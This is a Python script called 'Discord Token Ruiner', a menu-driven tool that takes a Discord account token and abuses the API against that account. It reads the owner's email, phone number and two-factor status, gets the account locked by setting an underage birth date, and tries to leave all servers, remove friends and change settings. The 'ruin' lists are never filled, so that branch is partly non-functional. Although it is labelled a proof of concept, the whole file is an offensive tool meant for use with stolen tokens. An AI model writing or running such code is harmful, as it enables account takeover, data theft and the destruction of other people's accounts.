# Project Name: Discord Token Ruiner
# Project Author: VoidLSD
# Project Reason: Proof of Concept of account ruination using a token and API abuse.

import requests
import os
import colorama
from colorama import Fore

url = 'https://canary.discordapp.com/api/v8/users/@me'

guildsIds = []
friendsIds = []

os.system("clear")
token = input("Token : ")

headers = {'authorization': str(token)}
src = requests.get(url, headers=headers)
if src.status_code == 200:
    print('Token is valid.')
    input('Press any key to continue...')
else:
    print('Token is invalid...')
    exit(0)

def tokenRuin(token):
    headers = {'Authorization': token}
    print("Account has been ruined successfully!")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    while True:
        setting = {'theme': 'light', 'locale': 'zh-CN'}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
        exit(0)

def tokenDisable(token):
    r = requests.patch(url, headers={'Authorization': token}, json={'date_of_birth': '2016-8-15'})
    if r.status_code == 400:
        print('Account has been disabled successfully!')
        exit(0)

def grabInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
  User Name: {userName}
  User ID: {userID}
  2 Factor: {mfa}
  Email: {email}
  Phone Number: {phone if phone else "None"}
            ''')
            

os.system("clear")

intro = """
  ·▄▄▄▄  ▄▄▄▄▄▄▄▄  
  ██▪ ██ •██  ▀▄ █·
  ▐█· ▐█▌ ▐█.▪▐▀▀▄ 
  ██. ██  ▐█▌·▐█•█▌
  ▀▀▀▀▀•  ▀▀▀ .▀  ▀
 Discord Token Ruiner
 Created by VoidLSD
 [1] Grab Info
 [2] Disable
 [3] Ruin
 [4] Exit
 """
print(Fore.GREEN+intro)

choice = input("Select: ")

if choice == '1':
    grabInfo(token)
    exit(0)
elif choice == '2':
    tokenDisable(token)
elif choice == '3':
    tokenRuin(token)
elif choice == '4':
    exit(0)
else:
  print(Fore.RED+"This option is invalid! Please try again.")
